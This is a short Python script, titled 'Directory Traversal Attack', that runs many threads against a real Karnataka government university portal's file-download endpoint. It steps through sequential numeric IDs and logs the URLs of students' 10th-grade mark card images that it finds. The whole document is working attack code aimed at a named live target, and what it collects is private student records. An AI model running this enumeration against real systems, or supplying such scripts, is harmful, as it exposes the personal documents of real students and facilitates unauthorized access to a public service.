# Directory Traversal Attack

import requests
import threading

num = int(input("Enter Starting range : "))
totalRange = int(input("Enter No. of threads to use : "))
threads = []

def directoryTraversalAttack():
    global num
    while True:
        url = f"https://uucms.karnataka.gov.in/Login/DownloadFile?folder=10thMarksCards&filename={num}_10thMarkCard.jpg"
        response = requests.get(url, stream=True)
        print(f"Status : {response.status_code} | Num : {num}")
        
        # Check if the status code is 200 (OK)
        if response.status_code == 200:
            print(f"Working {url} {num}")
            # local_filename = f"files/20190358{num}_10thMarkCard.jpg"
            local_filename = f"urls/URL.txt"
            with open(local_filename, 'a') as f:
                f.write(f"{url}\n")
        num += 1

for i in range(1, totalRange+1):
    t = threading.Thread(target=directoryTraversalAttack)
    threads.append(t)
    t.start()

for t in threads:
    t.join()